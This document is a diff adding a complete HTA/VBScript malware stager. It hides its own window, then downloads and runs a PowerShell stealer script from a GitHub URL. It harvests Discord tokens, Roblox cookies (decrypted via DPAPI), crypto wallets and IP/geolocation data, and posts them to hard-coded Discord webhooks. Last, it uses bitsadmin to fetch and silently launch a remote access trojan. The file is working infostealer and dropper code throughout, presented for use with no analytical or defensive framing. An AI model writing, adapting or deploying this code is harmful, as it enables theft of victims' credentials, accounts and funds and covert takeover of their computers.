@@ -1,0 +1,263 @@
+<!--
+============================================================
+  STAGER.HTA  —  Delivery Vehicle
+  Victim opens → downloads + runs steal.ps1 →
+  parses results → exfiltrates to Discord webhooks →
+  drops RAT.
+============================================================
+  ROUTING:
+    WEBHOOK_COOKIES → IP, Discord tokens, Roblox, wallets, passwords
+    WEBHOOK_RAT     → RAT deployment confirmations
+============================================================
+-->
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no"
+  showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0 : window.moveTo -2000,-2000
+On Error Resume Next
+
+' ============================================================
+'  CONFIG — Only PS1_URL and RAT_URL left to fill
+' ============================================================
+Const WEBHOOK_COOKIES = "https://discord.com/api/webhooks/1533019824278732850/GC8ok10MrZCYGkRl7RKHCV5YCTZ1TZqPJDu45TLPJoFNYUwEyTH8iG9YS00K98CwcLsu"
+Const WEBHOOK_RAT     = "https://discord.com/api/webhooks/1533019807627214928/n1FLzESTi1BhzC5R90ok8V7esa2RasQzOFhZVLoEeA-cBoUSB2DXuobLhhTuwc4n1BQf"
+Const PS1_URL         = "https://raw.githubusercontent.com/kalk17jjr-bot/dicerigger/main/steal.ps1"
+Const RAT_URL         = "https://raw.githubusercontent.com/kalk17jjr-bot/dicerigger/main/check.exe"
+Const AGENT_URL       = "https://raw.githubusercontent.com/kalk17jjr-bot/dicerigger/main/agent.exe"
+' ============================================================
+
+Dim sh, fso
+Set sh   = CreateObject("WScript.Shell")
+Set fso  = CreateObject("Scripting.FileSystemObject")
+
+Dim PC   : PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+Dim USER : USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' --- Main ---
+Call GrabIP
+Call GrabTokens
+Call GrabRoblox
+Call DropRAT
+window.close()
+
+Sub GrabIP()
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ip : ip = xh.responseText
+    If Len(ip) < 7 Then Exit Sub
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ll : ll = Split(xh.responseText, vbLf)
+    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | User: " & USER
+    PostEmbed "Target Online", info, 3447003, WEBHOOK_COOKIES
+    Set xh = Nothing
+End Sub
+
+Sub GrabTokens()
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", PS1_URL, False
+    xh.Send
+    If xh.Status <> 200 Then
+        PostEmbed "ERROR", "PS1 download failed — HTTP " & xh.Status, 16711680, WEBHOOK_COOKIES
+        Exit Sub
+    End If
+    Dim pc : pc = xh.responseText
+    If Len(pc) < 100 Then
+        PostEmbed "ERROR", "PS1 payload too small: " & Len(pc) & " bytes", 16711680, WEBHOOK_COOKIES
+        Exit Sub
+    End If
+    Set xh = Nothing
+
+    Dim psf : psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
+
+    Dim tf : tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then
+        PostEmbed "ERROR", "No steal_result.txt — PS1 may have crashed", 16711680, WEBHOOK_COOKIES
+        Exit Sub
+    End If
+
+    Dim raw : raw = ReadFile(tf)
+    fso.DeleteFile tf, True
+    If Len(raw) < 10 Then
+        PostEmbed "INFO", "Results empty — no data found on this machine", 16753920, WEBHOOK_COOKIES
+        Exit Sub
+    End If
+
+    Dim lines : lines = Split(raw, vbCrLf)
+    Dim l, count : count = 0
+    For Each l In lines
+        If Len(l) < 10 Then
+            ' skip
+        ElseIf Left(l, 8) = "DISCORD|" Then
+            Dim p : p = Split(Mid(l, 9), "|")
+            If UBound(p) >= 4 Then
+                Dim info : info = "**User:** " & p(0) & vbCrLf
+                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                info = info & "**Token:** ||" & p(4) & "||"
+                PostEmbed "Discord Token", info, 5793266, WEBHOOK_COOKIES
+                count = count + 1
+            End If
+        ElseIf Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+            PostEmbed "Roblox Cookie", Mid(l, 8), 65280, WEBHOOK_COOKIES
+            count = count + 1
+        ElseIf Left(l, 7) = "WALLET|" Then
+            PostEmbed "Crypto Wallet", Mid(l, 8), 16753920, WEBHOOK_COOKIES
+            count = count + 1
+        End If
+    Next
+    PostEmbed "Summary", "Total results exfiltrated: " & count, 65280, WEBHOOK_COOKIES
+End Sub
+
+Sub GrabRoblox()
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(3) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+
+    Dim fp : fp = ""
+    Dim i
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
+    Next
+
+    If Len(fp) = 0 Then
+        Dim pk : pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
+                    Dim uwp : uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp : Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+    If Len(fp) = 0 Then Exit Sub
+
+    Dim raw : raw = ReadFile(fp)
+    If Len(raw) < 50 Then Exit Sub
+
+    Dim cookie : cookie = ""
+    If InStr(raw, "_|WARNING") > 0 Then
+        cookie = raw
+    ElseIf InStr(raw, "CookiesData") > 0 Then
+        Dim sp : sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep : ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64 : b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+            End If
+        End If
+    ElseIf InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp : rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+    Else
+        cookie = raw
+    End If
+
+    cookie = Replace(cookie, vbCr, "")
+    cookie = Replace(cookie, vbLf, "")
+    cookie = Replace(cookie, vbTab, "")
+    cookie = Trim(cookie)
+
+    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, WEBHOOK_COOKIES
+    PostFile "cookie.txt", cookie, WEBHOOK_COOKIES
+End Sub
+
+Sub DropRAT()
+    If RAT_URL = "<<<YOUR_RAT_HOSTING_URL>>>" Then Exit Sub
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
+    sh.Run "bitsadmin /transfer rdownload /download /priority high " & RAT_URL & " " & op, 0, True
+    If fso.FileExists(op) Then
+        sh.Run op, 0, False
+        PostEmbed "RAT", "agent.exe deployed on " & PC, 65280, WEBHOOK_RAT
+    End If
+End Sub
+
+' --- Helpers ---
+Function TmpFile(name)
+    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
+End Function
+
+Sub WriteFile(path, content)
+    Dim f : Set f = fso.CreateTextFile(path, True)
+    f.Write content : f.Close : Set f = Nothing
+End Sub
+
+Function ReadFile(path)
+    ReadFile = ""
+    If Not fso.FileExists(path) Then Exit Function
+    Dim f : Set f = fso.OpenTextFile(path, 1)
+    ReadFile = f.ReadAll : f.Close : Set f = Nothing
+End Function
+
+Sub PostEmbed(t, d, c, wh)
+    Dim DQ : DQ = Chr(34)
+    Dim j : j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", wh, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
+Sub PostFile(fn, ct, wh)
+    Dim DQ : DQ = Chr(34)
+    Dim b : b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    Dim bd : bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", wh, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+End Sub
+
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    Dim inf : inf = TmpFile("dpi.txt")
+    Dim outf : outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps : ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf : psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(outf) Then
+        If fso.GetFile(outf).Size > 10 Then DecryptDPAPI = ReadFile(outf)
+    End If
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+End Function
+
+Function Ej(s)
+    Ej = s
+    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
+    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
+    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbCr, Chr(92) & "n")
+    Ej = Replace(Ej, vbLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbTab, Chr(92) & "t")
+End Function
+</script>
+</head><body></body></html>
